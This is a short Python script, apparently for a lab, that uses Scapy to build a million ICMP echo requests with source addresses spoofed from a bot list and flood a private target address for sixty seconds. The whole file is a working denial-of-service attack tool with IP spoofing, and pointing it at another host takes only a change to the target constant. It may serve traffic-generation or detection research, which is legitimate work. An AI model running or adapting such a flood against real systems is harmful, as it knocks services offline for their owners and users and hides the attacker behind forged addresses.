from scapy.all import *
import random
import time
import ipaddress
import threading

# Scapy ICMP Echo Flood (60 seconds)
TARGET_IP = "192.168.100.2"
BOTFILE = "../bots.txt"
NUM_PACKETS = 1000000
SEND_DURATION = 60

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def test(packet_list):
    sendpfast(packet_list, iface="enp3s0", file_cache=True)

def run_icmp_flood_attack():
    bot_ips = load_bots(BOTFILE)
    lista_de_pacotes = []
    numero_de_pacotes_enviados = 0


    start_build = time.perf_counter()
    while True:
        source_ip = random.choice(bot_ips)
        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        icmp_layer = ICMP(type=8, code=0)  # Echo Request, no payload
        packet = eth_layer / ip_layer / icmp_layer
        lista_de_pacotes.append(packet)
        numero_de_pacotes_enviados += 1

        if numero_de_pacotes_enviados == NUM_PACKETS:
            break
    end_build = time.perf_counter()
    build_duration = end_build - start_build

    print(f"\nPacket creation completed.")
    print(f"Time to build packets: {build_duration:.4f} seconds")

    print(f"\nSending packets for {SEND_DURATION} seconds...")

    thread = threading.Thread(target=test(lista_de_pacotes))
    thread.start()

    time.sleep(SEND_DURATION)

    exit(0)

if __name__ == "__main__":
    run_icmp_flood_attack()

# sudo PYTHONPATH=$HOME/scapy python3 scapy_test_icmp_echo_flood.py